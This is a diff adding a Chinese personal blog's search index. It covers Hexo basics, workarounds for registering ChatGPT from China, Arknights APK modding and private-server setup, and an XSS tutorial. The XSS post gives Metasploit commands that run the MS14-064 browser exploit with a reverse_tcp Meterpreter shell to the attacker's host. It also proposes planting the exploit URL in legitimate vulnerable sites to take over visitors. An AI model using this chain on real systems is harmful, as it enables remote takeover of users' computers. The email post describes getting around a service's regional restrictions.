@@ -1,0 +1,363 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2023/08/08/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>在hexo上新建文章の教程</title>
+    <url>/2023/03/05/%E5%9C%A8hexo%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%9B%E5%BB%BA%E6%96%B0%E6%96%87%E7%AB%A0%EF%BC%88%E4%BF%9D%E5%A7%86%E7%BA%A7%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="在hexo从零开始创建新文章（保姆级）"><a href="#在hexo从零开始创建新文章（保姆级）" class="headerlink" title="在hexo从零开始创建新文章（保姆级）"></a>在hexo从零开始创建新文章（保姆级）</h2><hr>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><em>hexo 是一个非常好用的博客网站（确信<br>我们可以用它搭建独属于自己的博客</em><br>ps：本文前提为已搭建好hexo的情况下</p>
+<hr>
+<h3 id="新建一个文章"><a href="#新建一个文章" class="headerlink" title="新建一个文章"></a>新建一个文章</h3><p>要新建一个文章，我们需要用到git bash<br>首先打开git bash</p>
+<h2 id="进入安装hexo的文件夹，我这里是blog输入命令以创建文章示例：-编辑文章-文章变量首先，找到我们创建的新文章，目录为-source-posts-你的新文章的名字-md打开后你会看见文章的变量设置常见的变量设置-编辑文章hexo的文章使用的是-md后缀，和我们日常的txt、docx、doc等兼容性很强，不过也有更多玩法，这里就不加以赘述了-发布文章"><a href="#进入安装hexo的文件夹，我这里是blog输入命令以创建文章示例：-编辑文章-文章变量首先，找到我们创建的新文章，目录为-source-posts-你的新文章的名字-md打开后你会看见文章的变量设置常见的变量设置-编辑文章hexo的文章使用的是-md后缀，和我们日常的txt、docx、doc等兼容性很强，不过也有更多玩法，这里就不加以赘述了-发布文章" class="headerlink" title="进入安装hexo的文件夹，我这里是blog输入命令以创建文章示例：- - -## 编辑文章-文章变量首先，找到我们创建的新文章，目录为    .&#x2F;source&#x2F;_posts&#x2F;[你的新文章的名字].md打开后你会看见文章的变量设置常见的变量设置- - -## 编辑文章hexo的文章使用的是.md后缀，和我们日常的txt、docx、doc等兼容性很强，不过也有更多玩法，这里就不加以赘述了- - -## 发布文章"></a>进入安装hexo的文件夹，我这里是blog<br><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ./hexo/blog<br></code></pre></td></tr></table></figure><br>输入命令以创建文章<br><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hexo new [layout] &lt;title&gt;<br><span class="hljs-comment"># layout 文章的布局，默认post，可以省略不写</span><br><span class="hljs-comment"># title 文章的标题，也是我们创建后的文件名，文件创建在./source/_posts里</span><br></code></pre></td></tr></table></figure><br>示例：<br><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hexo new 新文章<br>...<br>INFO  Created: /blog/source/_posts/新文章.md<br></code></pre></td></tr></table></figure><br>- - -<br>## 编辑文章-文章变量<br>首先，找到我们创建的新文章，目录为<br><br>    .&#x2F;source&#x2F;_posts&#x2F;[你的新文章的名字].md<br><br>打开后你会看见文章的变量设置<br><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">---<br>title: [文章名]<br><span class="hljs-built_in">date</span>: [创建时间]<br>tags:<br>---<br></code></pre></td></tr></table></figure><br>常见的变量设置<br class='item-img' data-src='http://127.0.0.1:45241/i/2023/04/19/12fp2l5.png'><img src="http://127.0.0.1:45241/i/2023/04/19/12fp2l5.png" alt="常见的变量设置"><br>- - -<br>## 编辑文章<br>hexo的文章使用的是.md后缀，和我们日常的txt、docx、doc等兼容性很强，不过也有更多玩法，这里就不加以赘述了<br>- - -<br>## 发布文章</h2><p>到了这里，我们就已经成功的写好了一个名为“新文章”的md文件，不过我们的文章还没法立即刷新在我们的博客中，我们需要刷新博客文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Administrator@XT-20230223DZXR MINGW64 /i/乐/hexo/blog<br>$ hexo g<br>INFO  Validating config<br>INFO  Start processing<br>INFO  Files loaded <span class="hljs-keyword">in</span> 332 ms<br>INFO  Generated: archives/index.html<br>INFO  Generated: 2023/03/04/everyone”/index.html<br>INFO  Generated: archives/2023/index.html<br>INFO  Generated: index.html<br>INFO  Generated: archives/2023/03/index.html<br>INFO  Generated: 2023/03/05/在hexo从零开始创建新文章（保姆级）/index.html<br>INFO  6 files generated <span class="hljs-keyword">in</span> 161 ms<br></code></pre></td></tr></table></figure>
+<p>刷新完博客文件后直接运行博客</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Administrator@XT-20230223DZXR MINGW64 /i/乐/hexo/blog<br>$ hexo s<br>INFO  Validating config<br>INFO  Start processing<br>INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.<br><br></code></pre></td></tr></table></figure>
+<p>博客运行完毕，刷新我们的博客页面后，你的文章就已经安安静静地躺在了你的博客中，恭喜你，一切完成。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ChatGPT的可用邮箱</title>
+    <url>/2023/08/08/ChatGPT%E7%9A%84%E5%8F%AF%E7%94%A8%E9%82%AE%E7%AE%B1/</url>
+    <content><![CDATA[<p>由于OpenAI限制中国人使用其服务，因此目前国内的电子邮箱基本上都注册不了ChatGPT，以下邮箱已确认不能用于注册OpenAI:</p>
+<p>1、QQ邮箱<br>2、foxmail邮箱<br>3、163邮箱<br>4、网易邮箱yeah.net，126邮箱<br>5、新浪邮箱<br>6、Outlook<br>7、hotmail邮箱<br>eud.cn邮箱以及其他以.cn结尾的邮箱<br>Gmail(只能通过快捷登录，也就是Continue with Google)，如果IP质量够高，有时候也能通过邮箱加密码的形式注册。如果IP质量不行，就会显示 Oops!The email you provided is not supported.</p>
+<p>###中国内地的邮箱基本上都被禁了，注册时会提示：Signup is currently unavailable, please try again later  具体原因：ChatGPT无法注册的原因错误提示：Signup is currently unavailable, please try again later</p>
+<p>国内的不能用，那我们就用国外的，以下是国外一些常见的免费电子邮箱，可以用于注册ChatGPT帐号，注册时建议使用国外的IP地址。</p>
+<p>##Gmail<br>这个没啥好说的，邮箱+密码以及Continue with Google这两种方式都能用，如果你还没有Gmail，这里有一个注册教程：如何注册谷歌邮箱Gmail?遇到错误提示：此电话号码无法用于进行验证怎么办？免电话验证即可！</p>
+<p>##Mail.com<br>注册网址：<a href="https://signup.mail.com/%EF%BC%8C%E6%9C%89%E5%87%A0%E5%8D%81%E4%B8%AA%E5%9F%9F%E5%90%8D%E5%90%8E%E7%BC%80%E5%8F%AF%E4%BB%A5%E9%80%89%EF%BC%8C%E5%BE%88%E5%AE%B9%E6%98%93%E6%B3%A8%E5%86%8C%EF%BC%8C%E4%B8%8D%E9%9C%80%E8%A6%81%E9%AA%8C%E8%AF%81%E6%89%8B%E6%9C%BA%E5%8F%B7%E7%A0%81%EF%BC%88%E9%80%89%E9%82%AE%E7%AE%B1%E9%AA%8C%E8%AF%81%EF%BC%89">https://signup.mail.com/，有几十个域名后缀可以选，很容易注册，不需要验证手机号码（选邮箱验证）</a></p>
+<p>##zoho.com<br>注册网址：<a href="https://www.zoho.com/mail/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E4%B8%AD%E5%9B%BD%E6%89%8B%E6%9C%BA%E5%8F%B7%E7%A0%81%E6%B3%A8%E5%86%8C">https://www.zoho.com/mail/，可以用中国手机号码注册</a></p>
+<p>##ProtonMail<br>注册网址：<a href="https://account.proton.me/signup%EF%BC%8C%E6%B3%A8%E5%86%8C%E7%95%8C%E9%9D%A2%E5%BE%88%E7%AE%80%E6%B4%81">https://account.proton.me/signup，注册界面很简洁</a><br>可以选proton.me或者protonmail.com后缀，VPS大玩家使用proton.me后缀的邮箱注册了一个ChatGPT账号</p>
+<p>##skiff.com<br>注册网址：<a href="https://app.skiff.com/%EF%BC%8C%E6%B3%A8%E5%86%8C%E9%9D%9E%E5%B8%B8%E7%AE%80%E5%8D%95%EF%BC%8C%E4%B8%8D%E9%9C%80%E8%A6%81%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E4%B8%89%E4%B8%AA%E9%82%AE%E7%AE%B1%E5%88%AB%E5%90%8D%EF%BC%8C%E8%BF%99%E6%A0%B7%E4%B8%80%E4%B8%AA%E9%82%AE%E7%AE%B1%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%B3%A8%E5%86%8C%E5%9B%9B%E4%B8%AAChatGPT%E8%B4%A6%E5%8F%B7">https://app.skiff.com/，注册非常简单，不需要短信验证，可以添加三个邮箱别名，这样一个邮箱就可以注册四个ChatGPT账号</a></p>
+<p>##AOL.COM<br>注册网址：<a href="https://login.aol.com/account/create%EF%BC%8C%E9%9C%80%E8%A6%81%E9%AA%8C%E8%AF%81%E6%89%8B%E6%9C%BA%E5%8F%B7%E7%A0%81%EF%BC%8C%E4%B8%8D%E6%94%AF%E6%8C%81%E4%B8%AD%E5%9B%BD%E6%89%8B%E6%9C%BA%E5%8F%B7%E7%A0%81%EF%BC%8CGoogle">https://login.aol.com/account/create，需要验证手机号码，不支持中国手机号码，Google</a> Voice也用不了，可以使用接码平台的号码。VPS大玩家用的是sms-activate.org，这个平台可以使用支付宝充值，有中文界面，非常方便。<br>注册成功以后，可以在Account Security界面移除用于验证的手机号码，并添加自己的电子邮箱作为辅助验证的方式</p>
+<p>##yahoo.com<br>注册网址：<a href="https://login.yahoo.com/account/create">https://login.yahoo.com/account/create</a><br>2021 年 11 月 1 日起，用户将无法从中国大陆使用 Yahoo 的产品与服务。但这并不影响 Yahoo 在全球其他地方的产品及服务，所以你得使用国外的IP才能注册Yahoo邮箱。<br>需要验证手机号码，Google Voice不能用，可以使用接码平台。VPS大玩家用的是sms-activate.org，这个平台可以使用支付宝充值，有中文界面，非常方便。Yahoo会根据IP地址锁定你的国家，需要使用IP地址所在国的号码进行验证。<br>注册成功以后，可以在Account Security界面移除用于验证的手机号码，并添加自己的电子邮箱作为辅助验证的方式</p>
+<p>##gmx.com<br>注册网址：<a href="https://signup.gmx.com/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%89gmx.com%E6%88%96%E8%80%85gmx.us%E5%90%8E%E7%BC%80%EF%BC%8C%E7%94%B1%E4%BA%8Egmx.com%E5%B7%B2%E7%BB%8F%E4%B8%8D%E8%83%BD%E6%B3%A8%E5%86%8CChatGPT%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5VPS%E5%A4%A7%E7%8E%A9%E5%AE%B6%E9%80%89%E4%BA%86gmx.us%E5%90%8E%E7%BC%80%E3%80%82%E8%B7%9Fmail.com%E4%B8%80%E6%A0%B7%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%89%E9%82%AE%E7%AE%B1%E4%BD%9C%E4%B8%BA%E8%BE%85%E5%8A%A9%E9%AA%8C%E8%AF%81%E6%96%B9%E5%BC%8F">https://signup.gmx.com/，可以选gmx.com或者gmx.us后缀，由于gmx.com已经不能注册ChatGPT了，所以VPS大玩家选了gmx.us后缀。跟mail.com一样，可以选邮箱作为辅助验证方式</a></p>
+<p>由于OpenAI一直在提高其注册门槛，被禁止用于注册ChatGPT的邮箱后缀只会越来越多，大家也可以自己去寻找免费的电子，通过Google搜索关键词Free Email providers就可以找到很多。如果您发现上面的邮箱不能用于注册ChatGPT，请留下您宝贵的经验以帮助其他人，感谢！</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Local Arknights</title>
+    <url>/2023/08/08/Local%20Arknights/</url>
+    <content><![CDATA[<h1 id="Local-Arknight搭建教程"><a href="#Local-Arknight搭建教程" class="headerlink" title="Local Arknight搭建教程"></a>Local Arknight搭建教程</h1><h3 id="测试系统-Windows-20012-64"><a href="#测试系统-Windows-20012-64" class="headerlink" title="测试系统 Windows 20012 64"></a>测试系统 Windows 20012 64</h3><p>解压服务端到D盘根目录，服务器没有D盘的其他盘也可以，除了C盘</p>
+<p>D:\myfz</p>
+<h2 id="安装环境："><a href="#安装环境：" class="headerlink" title="安装环境："></a>安装环境：</h2><ul>
+<li>D:\myfz\环境\MSVBCFJ_AIO_2016.04_X86+x64.exe</li>
+<li>D:\myfz\环境\java环境.exe</li>
+<li>D:\myfz\环境\notepad++中文版</li>
+</ul>
+<p>配置环境管理员权限打开：</p>
+<ul>
+<li>D:\myfz\环境\Java环境变量一键配置.exe（一般用不上…）<ul>
+<li>选择 C:\Program Files\Java\jdk1.8.0_91 一键配置</li>
+</ul>
+</li>
+<li>检验环境是否已安装好：<ul>
+<li>PowerShell输入<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -version<br></code></pre></td></tr></table></figure></li>
+<li>出现版本信息即为安装成功</li>
+</ul>
+</li>
+</ul>
+<h3 id="重启服务器"><a href="#重启服务器" class="headerlink" title="重启服务器"></a>重启服务器</h3><hr>
+<h3 id="服务端修改："><a href="#服务端修改：" class="headerlink" title="服务端修改："></a>服务端修改：</h3><p>D:\myfz\LocalArknights 1.9.3\config.json</p>
+<h3 id="服务端启动："><a href="#服务端启动：" class="headerlink" title="服务端启动："></a>服务端启动：</h3><p>D:\myfz\服务启动.exe</p>
+<hr>
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="客户端修改："><a href="#客户端修改：" class="headerlink" title="客户端修改："></a>客户端修改：</h3><ul>
+<li><p>反编译apk文件，推荐使用apktool</p>
+<ul>
+<li>在apktool.jar目录下打开cmd窗口，输入</li>
+<li><code>java -jar apktool.jar d -r 明日方舟.apk</code></li>
+</ul>
+</li>
+<li><p>命令解释：d为反编译，-r是不编译resources，因不需要修改resources所以不编译</p>
+</li>
+</ul>
+<hr>
+<h3 id="反编译后"><a href="#反编译后" class="headerlink" title="反编译后"></a>反编译后</h3><p>修改<br>smali\com\u8\sdk\U8UnityContext.smali<br>将192.168.xxx.xxx修改为你的IP（打算对外开放用公网ip，自己玩用内网or127.0.0.1）</p>
+<p>然后在apktool.jar目录下打开cmd窗口，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar apktool.jar b xxx<br></code></pre></td></tr></table></figure>
+
+<p>xxx为编译出来的文件夹名称</p>
+<p>随后签名apk并安装即可，不懂的建议百度，太长了这里就不展开来讲</p>
+<h3 id="游玩提示"><a href="#游玩提示" class="headerlink" title="游玩提示"></a>游玩提示</h3><p>打开游戏后选择注册账号，验证码随便填就行</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>明日方舟之修改立绘</title>
+    <url>/2023/08/08/%E6%98%8E%E6%97%A5%E6%96%B9%E8%88%9F%E4%B9%8B%E4%BF%AE%E6%94%B9%E7%AB%8B%E7%BB%98/</url>
+    <content><![CDATA[<h1 id="明日方舟の立绘修改"><a href="#明日方舟の立绘修改" class="headerlink" title="明日方舟の立绘修改"></a>明日方舟の立绘修改</h1><h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><ul>
+<li>电脑一台<ul>
+<li>系统Windows</li>
+</ul>
+</li>
+<li>手一双</li>
+<li>脑子一个</li>
+</ul>
+<hr>
+<h2 id="准备材料："><a href="#准备材料：" class="headerlink" title="准备材料："></a>准备材料：</h2><ul>
+<li>明日方舟apk一个<ul>
+<li>建议使用Q群234334714群文件内的明日方舟，其余版本暂未测试方法可能略有出入</li>
+</ul>
+</li>
+<li>Apktool.jar<ul>
+<li>解包和打包APK</li>
+</ul>
+</li>
+<li>AssetStudio.net6.v0.16.47<ul>
+<li>导出AssesBundle内所需文件</li>
+</ul>
+</li>
+<li>Unity AssetBundleExtractor<ul>
+<li>将改好的文件导入AssesBundle</li>
+</ul>
+</li>
+<li>Photoshop<ul>
+<li>图片修改</li>
+</ul>
+</li>
+<li>JAVA1.8以上</li>
+</ul>
+<hr>
+<h2 id="解包明日方舟APK"><a href="#解包明日方舟APK" class="headerlink" title="解包明日方舟APK"></a>解包明日方舟APK</h2><p>在Apktool.jar目录下打开cmd窗口，输入：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar apktool.jar<br></code></pre></td></tr></table></figure></div>
+<p>命令解释：d是解包，-r指不解包resources，z.apk替换为明日方舟apk的路径</p>
+<p>在解包出来的文件夹下，打开干员目录<br>Xxx→assets→AB→Android→charpack</p>
+<ul>
+<li>当文件夹内为char_xxx_xxx.ab文件时即为正确</li>
+</ul>
+<hr>
+<h2 id="导出立绘"><a href="#导出立绘" class="headerlink" title="导出立绘"></a>导出立绘</h2><p>找到你想要修改的干员，例如阿（char_225_haak.ab）</p>
+<p>然后打开AssetStudio，依次选择File→Load File，然后打开你想要修改的干员的ab包文件<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awoor.png"
+                      alt="AssetStudio首页"
+                ></p>
+<p>打开Filter Type，选择Texture2D<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awmsi.png"
+                      alt="AssetStudio Filter Type"
+                ></p>
+<p>找到char_225_haak_1和char_225_haak_1[alpha]</p>
+<p>Ctrl+左键选中，然后右键选择Export xxxxxxx，随后随便选择一个文件夹导出<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awoew.png"
+                      alt="导出char_225_1和char_225_haak_1[alpha]"
+                ></p>
+<p>打开PhotoShop，将图片与导出图片等比例对齐<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awmks.png"
+                      alt="PS1"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awoe1.png"
+                      alt="PS2"
+                ></p>
+<p>成品如上，大小限制为1024x1024</p>
+<p>修改好后，将白背景的名字修改为char_225_haak_1并导出为PNG格式，黑背景的名字修改为char_225_haak_1[alpha]并导出为PNG格式。</p>
+<hr>
+<h2 id="修改ab包"><a href="#修改ab包" class="headerlink" title="修改ab包"></a>修改ab包</h2><p>打开UABE（Unity Asset Bundle Extractor）</p>
+<p>依次选择文件→打开，然后打开想要修改的角色的ab包。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awnq8.png"
+                      alt="UABE1"
+                ><br>在弹出的窗口中选择是，然后将文件名修改为a1</p>
+<p>选择信息，在弹出的窗口中找到char_225_haak_1和char_225_haak_1[alpha]，先选中其中一个!</p>
+<p>在右侧选择插件，在弹出的窗口中选择Edit<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awnk2.png"
+                      alt="Edit"
+                ></p>
+<p>打开Load，选择对应的文件，char_225_haak_1就选择char_225_haak_1.png，以此类推<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awol3.png"
+                      alt="Load"
+                ></p>
+<p>选好后选择OK，在弹出的窗口中选择Fast，然后点OK，文件就成功导入进去啦。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awnwi.png"
+                      alt="Fast"
+                ></p>
+<p>char_225_haak_1[alpha]同上。</p>
+<p>当两个文件全部替换好后点最底下的确定，保存更改，并将其命名为char_225_haak.ab</p>
+<hr>
+<h2 id="APK重打包"><a href="#APK重打包" class="headerlink" title="APK重打包"></a>APK重打包</h2><p>将改好的ab包替换掉反编译apk中的ab包<br>随后返回到apktool.jar的目录下，打开cmd，输入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar apktool.jar b z<br></code></pre></td></tr></table></figure></div>
+
+<p>命令解释：b为重打包，z为反编译出来的文件的文件夹</p>
+<p>最后，安安静静地饮饮茶，看看书，等apktool自动打包完</p>
+<h2 id="apk签名"><a href="#apk签名" class="headerlink" title="apk签名"></a>apk签名</h2><p>这里推荐用apksinger，关于签名就不展开来讲了。</p>
+<hr>
+<p>Apk签名完后就可以安装到模拟器或者发送到手机上安装打开</p>
+<p>当你找到修改的角色（阿）的原皮肤时，就可以看到角色的立绘已经被完美替换掉了。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://106.52.208.142:8654/i/2023/08/08/7awsso.jpeg"
+                      alt="成品图"
+                ></p>
+<hr>
+<h3 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h3><p>本教程仅限于群文件中的APK，对官服的apk不建议替换，会有封号的风险（应该）</p>
+<p>总之，官服的改别怕，怕别改，本地服就随便啦~</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>浅谈XSS</title>
+    <url>/2023/04/19/%E6%B5%85%E8%B0%88XSS/</url>
+    <content><![CDATA[<h1 id="利用XSS攻击"><a href="#利用XSS攻击" class="headerlink" title="利用XSS攻击"></a>利用XSS攻击</h1><p>声明：请合理运用，请勿随意侵入他人电脑，您的所有行为皆与本教程无关</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>一张图了解xss的运行原理<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://ask.qcloudimg.com/http-save/yehe-6005537/pvhp8tax17.png?imageView2/2/w/2560/h/7000"
+                      alt="1"
+                ></p>
+<h2 id="漏洞复现前的准备"><a href="#漏洞复现前的准备" class="headerlink" title="漏洞复现前的准备"></a>漏洞复现前的准备</h2><p>1.通过Kali linux，利用MS14_064漏洞，制作一个木马服务器。存在该漏洞的用户一旦通过浏览器访问木马服务器，会造成缓冲区溢出，攻击者可以直接获取用户的系统Shell。<br>2.将木马服务器的URL，插入到一个存在存储型XSS漏洞的正常web服务器中，一旦有人访问该服务器的挂马页面，而且该用户存在MS14_064漏洞，就会中招。</p>
+<p>此漏洞目前仅对以下设备有效<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://47.97.19.212:1445/1.jpg"
+                      alt="2"
+                ></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="Frist：初始化msf"><a href="#Frist：初始化msf" class="headerlink" title="Frist：初始化msf"></a>Frist：初始化msf<br><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><code class="hljs js">msfconsole  <span class="hljs-comment">//启动msf</span><br>msfdb init  <span class="hljs-comment">//初始化数据库，数据库初始化后能大幅提高msf查询速度</span><br>db_status  <span class="hljs-comment">//查看数据库连接状态</span><br></code></pre></td></tr></table></figure></div></h2><p>Second：利用MS14_064漏洞</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><code class="hljs js">search <span class="hljs-title class_">MS14</span>_064 <span class="hljs-comment">//搜索MS14_064漏洞</span><br></code></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://47.97.19.212:1445/3.PNG"
+                      alt="3"
+                ></p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><code class="hljs js">use exploit/windows/browser/ms14_064_ole_code_execution  <span class="hljs-comment">//调用exploit</span><br>options <span class="hljs-comment">//查看exploit设置，Required一项中标有yes的为必填项，默认填有的不建议改其余根据自身需求设置</span><br></code></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://47.97.19.212:1445/4.png"
+                      alt="4"
+                ></p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><code class="hljs js">set <span class="hljs-title class_">AllowPowershellPrompt</span> <span class="hljs-literal">true</span> <span class="hljs-comment">//设置允许调用powershell,M14_064需要用到主机的PowerShell</span><br>set srvhost &lt;kali <span class="hljs-variable constant_">IP</span>&gt;  <span class="hljs-comment">//设置木马服务器ip，默认为0.0.0.0</span><br></code></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://47.97.19.212:1445/5.png"
+                      alt="5"
+                ></p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><code class="hljs js">set payload windows/meterpreter/reverse_tcp  <span class="hljs-comment">//设置payload，使用reverse类型不会让连接被防火墙阻断</span><br>set lhost &lt;kali <span class="hljs-variable constant_">IP</span>&gt; <span class="hljs-comment">//设置监听ip</span><br>set lport &lt;端口号&gt;  <span class="hljs-comment">//设置监听端口只要是未占用的端口都可以</span><br>exploit <span class="hljs-comment">//开启攻击服务</span><br></code></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://47.97.19.212:1445/6.png"
+                      alt="6"
+                ><br>可以看到我们的攻击服务已经成功开启，并生成了URL(<a class="link"   href="http://192.168.1.58:8080/Z4ipOm4VqiaU)%EF%BC%8C%E4%B8%80%E6%97%A6%E5%AD%98%E5%9C%A8MS14_064%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE%E6%AD%A4URL%EF%BC%8C%E5%B0%B1%E8%A2%AB%E7%AB%8B%E5%8D%B3%E6%8E%A7%E5%88%B6" >http://192.168.1.58:8080/Z4ipOm4VqiaU)，一旦存在MS14_064漏洞的主机访问此URL，就被立即控制 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="受害人模拟"><a href="#受害人模拟" class="headerlink" title="受害人模拟"></a>受害人模拟</h2><p>受害人：WinXP (192.168.1.221)，通过IE访问<a class="link"   href="http://192.168.1.58:8080/Z4ipOm4VqiaU" >http://192.168.1.58:8080/Z4ipOm4VqiaU <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<hr>
+<p>访问后，kali这边就能够直接上线了<br>（笔者忘记截屏了，所以暂时借用一下别人的图）<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://ask.qcloudimg.com/http-save/yehe-6005537/j5z6f1hl5l.jpeg?imageView2/2/w/2560/h/7000"
+                      alt="7"
+                ></p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><code class="hljs js">sessions <span class="hljs-comment">//查看有会话窗口的主机</span><br>sessions -i &lt;id&gt; <span class="hljs-comment">//连接主机</span><br></code></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://ask.qcloudimg.com/http-save/yehe-6005537/x5pj77ljzj.png?imageView2/2/w/2560/h/7000"
+                      alt="8"
+                ><br>输入shell获取主机的cmd(shell)<br>出现中文乱码的情况切换编码即可</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>xss攻击是个不错的玩法，but对设备的局限性较大(仅限新手而言<br>相信你们看完后应该都会了吧（</p>
+]]></content>
+      <tags>
+        <tag>杂谈系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅谈So-VITS-SVC</title>
+    <url>/2023/09/29/%E6%B5%85%E8%B0%88So-VITS-SVC/</url>
